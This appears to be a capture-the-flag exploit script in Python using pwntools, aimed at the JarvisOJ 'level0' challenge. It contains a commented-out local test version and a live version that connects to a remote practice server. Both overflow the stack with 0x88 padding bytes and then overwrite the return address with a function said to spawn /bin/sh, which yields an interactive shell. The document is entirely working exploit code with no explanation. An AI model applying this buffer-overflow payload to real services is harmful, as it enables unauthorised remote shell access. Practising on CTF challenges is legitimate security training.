#!/usr/bin/env python
# coding=utf-8
from pwn import *
################# 

'''
p = process('level0.b9ded3801d6dd36a97468e128b81a65d')
junk = "A"*0x88		#栈溢出长度
addr1= 0x400596  #bin/sh地址
payload = ''
payload+=junk
payload+=p64(addr1)
p.send(payload)

#################m

'''
p = remote('pwn2.jarvisoj.com',9881)
junk = "A"*0x88
addr1= 0x400596

payload = ''
payload+=junk
payload+=p64(addr1)
p.send(payload)


#################







p.interactive()
